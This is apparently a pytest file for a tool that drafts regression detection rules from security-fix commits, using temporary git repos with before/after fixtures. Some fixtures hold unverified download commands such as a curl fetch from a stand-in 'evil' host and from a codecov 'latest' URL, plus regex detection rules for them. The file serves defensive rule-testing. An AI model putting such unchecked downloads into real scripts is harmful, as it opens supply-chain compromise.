"""Tests for harnessing/mine-ledger/scripts/emit_rule_drafts.py — regression-rule drafting."""

import importlib.util
import json
import shutil
import subprocess
import sys
from pathlib import Path

import pytest
from traust_engine.assets import default_rule_pack_dir

from traust.paths import skill_dir

_ROOT = Path(__file__).resolve().parents[1]
_SPEC = importlib.util.spec_from_file_location(
    "emit_rule_drafts", skill_dir("mine-ledger") / "scripts" / "emit_rule_drafts.py"
)
erd = importlib.util.module_from_spec(_SPEC)
sys.modules["emit_rule_drafts"] = erd
_SPEC.loader.exec_module(erd)

HAVE_OPENGREP = shutil.which("opengrep") is not None


def _git(repo, *args):
    subprocess.run(
        ["git", "-C", str(repo), "-c", "user.email=t@t", "-c", "user.name=t", *args],
        check=True,
        capture_output=True,
    )


def _source_repo(tmp_path, before, after, path="tools/dl.sh"):
    repo = tmp_path / "srcrepo"
    (repo / Path(path).parent).mkdir(parents=True)
    subprocess.run(["git", "init", "-q", "-b", "main", str(repo)], check=True)
    (repo / path).write_text(before)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "vulnerable")
    (repo / path).write_text(after)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "fix")
    fix = subprocess.run(
        ["git", "-C", str(repo), "rev-parse", "HEAD"], capture_output=True, text=True, check=True
    ).stdout.strip()
    return repo, fix


def _cand(repo, fix, path="tools/dl.sh"):
    return {
        "id": "bt-demo-001",
        "repo_url": f"file://{repo}",
        "fix_commit": fix,
        "evidence": {
            "kind": "ledger_event",
            "ref": "layer.json",
            "excerpt": "Commit deleted the download.",
        },
        "expected": [
            {
                "source_finding": "FIND-001",
                "fingerprint": "f" * 64,
                "cwes": ["CWE-494"],
                "paths": [path],
                "severity": "high",
                "title": "download without integrity check",
            }
        ],
    }


@pytest.mark.requires_git
def test_emit_draft_pairs(tmp_path):
    repo, fix = _source_repo(tmp_path, "curl -Os https://evil/latest/bin\n", "echo safe\n")
    out = tmp_path / "drafts"
    res = erd.emit_draft(_cand(repo, fix), out)
    assert res and res["lang"] == "bash" and res["files"] == 1
    d = out / res["draft"]
    assert "evil/latest" in (d / "before" / "dl.sh").read_text()
    assert "echo safe" in (d / "after" / "dl.sh").read_text()
    skel = (d / "rule.skeleton.yaml").read_text()
    assert "CWE-494" in skel and "regression_of" in skel and "f" * 64 in skel
    assert (d / "DRAFT.md").exists()


@pytest.mark.requires_git
def test_identical_pair_skipped(tmp_path):
    repo, _fix = _source_repo(tmp_path, "same\n", "changed\n", path="tools/dl.sh")
    # point the finding at a path the fix did NOT change
    (repo / "other.sh").write_text("same forever\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "add other")
    fix2 = subprocess.run(
        ["git", "-C", str(repo), "rev-parse", "HEAD"], capture_output=True, text=True, check=True
    ).stdout.strip()
    cand = _cand(repo, fix2, path="tools/dl.sh")  # unchanged by fix2
    assert erd.emit_draft(cand, tmp_path / "d2") is None


@pytest.mark.requires_git
def test_skip_existing_preserves_authored_draft(tmp_path, monkeypatch):
    """--skip-existing (the rule-mining lane's mode) must never clobber
    an authored-but-unpromoted draft dir."""
    repo, fix = _source_repo(tmp_path, "curl -Os https://evil/latest/bin\n", "echo safe\n")
    cand = _cand(repo, fix)
    out = tmp_path / "drafts"
    slug = erd.draft_slug(cand)
    authored = out / slug / "rule.skeleton.yaml"
    authored.parent.mkdir(parents=True)
    authored.write_text("rules: []  # AUTHORED\n")
    monkeypatch.setattr(erd.bb, "collect_candidates", lambda root: [cand])
    rc = erd.main(["--results-root", str(tmp_path), "--out-dir", str(out), "--skip-existing"])
    assert rc == 0
    assert "AUTHORED" in authored.read_text()
    # without the flag the draft is re-staged (skeleton regenerated)
    rc = erd.main(["--results-root", str(tmp_path), "--out-dir", str(out)])
    assert rc == 0
    assert "AUTHORED" not in authored.read_text()


@pytest.mark.requires_git
def test_unknown_language_skipped(tmp_path):
    repo, fix = _source_repo(tmp_path, "a\n", "b\n", path="conf/x.toml")
    assert erd.emit_draft(_cand(repo, fix, path="conf/x.toml"), tmp_path / "d3") is None


@pytest.mark.skipif(not HAVE_OPENGREP, reason="opengrep not on PATH")
def test_verify_pass_and_fail(tmp_path):
    d = tmp_path / "draft"
    (d / "before").mkdir(parents=True)
    (d / "after").mkdir()
    (d / "before" / "x.sh").write_text(
        "curl -Os https://uploader.codecov.io/latest/linux/codecov\n"
    )
    (d / "after" / "x.sh").write_text("echo fixed\n")
    rule = tmp_path / "r.yaml"
    rule.write_text("""rules:
  - id: t-rule
    languages: [bash]
    severity: ERROR
    message: t
    patterns:
      - pattern-regex: uploader\\.codecov\\.io/latest/
""")
    assert erd.verify(d, rule) == 0
    # a rule that also fires on after/ must FAIL verification
    bad = tmp_path / "bad.yaml"
    bad.write_text("""rules:
  - id: t-bad
    languages: [bash]
    severity: ERROR
    message: t
    patterns:
      - pattern-regex: ".+"
""")
    assert erd.verify(d, bad) == 1


@pytest.mark.skipif(not HAVE_OPENGREP, reason="opengrep not on PATH")
def test_promoted_codecov_rule_calibrates():
    """The pack's first regression rule keeps firing on its fixture."""
    pack = default_rule_pack_dir() / "bash"
    proc = subprocess.run(
        [
            "opengrep",
            "scan",
            "--config",
            str(pack / "supply-chain.yaml"),
            "--json",
            "--quiet",
            str(pack / "supply-chain.sh"),
        ],
        capture_output=True,
        text=True,
        timeout=300,
    )
    res = json.loads(proc.stdout)["results"]
    hits = [r for r in res if r["check_id"].endswith("codecov-uploader-latest")]
    assert len(hits) == 2


@pytest.mark.requires_git
def test_emit_draft_keeps_same_basename_paths(tmp_path):
    """Two expected paths with the same basename must both land in before/
    — a silently overwritten fixture narrows the calibration set."""
    paths = ["pkg/a/creds.go", "pkg/b/creds.go"]
    repo = tmp_path / "srcrepo"
    for p in paths:
        (repo / p).parent.mkdir(parents=True)
    subprocess.run(["git", "init", "-q", "-b", "main", str(repo)], check=True)
    for p in paths:
        (repo / p).write_text(f'// vulnerable {p}\nvar creds = "{p}"\n')
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "vulnerable")
    for p in paths:
        (repo / p).write_text("// fixed\n")
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "fix")
    fix = subprocess.run(
        ["git", "-C", str(repo), "rev-parse", "HEAD"],
        capture_output=True,
        text=True,
        check=True,
    ).stdout.strip()
    cand = {
        "id": "bt-demo-002",
        "repo_url": f"file://{repo}",
        "fix_commit": fix,
        "evidence": {"kind": "ledger_event", "ref": "layer.json", "excerpt": "x"},
        "expected": [
            {
                "source_finding": "FIND-001",
                "fingerprint": "f" * 64,
                "cwes": ["CWE-798"],
                "paths": paths,
                "severity": "high",
                "title": "hardcoded credential",
            }
        ],
    }
    res = erd.emit_draft(cand, tmp_path / "drafts")
    assert res, "draft must be emitted"
    assert res["files"] == 2
    before = sorted((tmp_path / "drafts" / res["draft"] / "before").iterdir())
    assert len(before) == 2, (
        f"same-basename fixtures overwrote each other: {[f.name for f in before]}"
    )
    texts = {f.read_text() for f in before}
    assert len(texts) == 2, "both fixtures' content must survive"
